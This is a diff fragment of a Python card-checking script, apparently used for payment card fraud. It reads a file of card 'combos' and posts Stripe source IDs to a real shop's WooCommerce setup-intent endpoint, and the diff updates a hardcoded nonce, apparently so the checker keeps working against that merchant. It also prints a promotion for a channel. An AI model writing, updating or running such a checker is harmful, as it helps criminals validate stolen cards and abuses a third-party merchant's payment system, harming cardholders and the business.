@@ -34,7 +34,7 @@ print(L + ascii_art)
 print(F + "□■" * 30)
 
 print('\t\033[1;31m>>> Join Me Channel WhyRandom')
-path = input("Enter You cc combo  :  ")
+path = input("Cambo :  ")
 start = 0
 with open(path) as file:
     lino = file.readlines()
@@ -121,7 +121,7 @@ def check_card(e):
 
         data = {
             'stripe_source_id': id,
-            'nonce': '5bff861ec9',
+            'nonce': 'a89cf73394',
         }
 
         response = requests.post('https://gourmetwarehouse.net/?wc-ajax=wc_stripe_create_setup_intent', params=params, cookies=cookies, headers=headers, data=data)
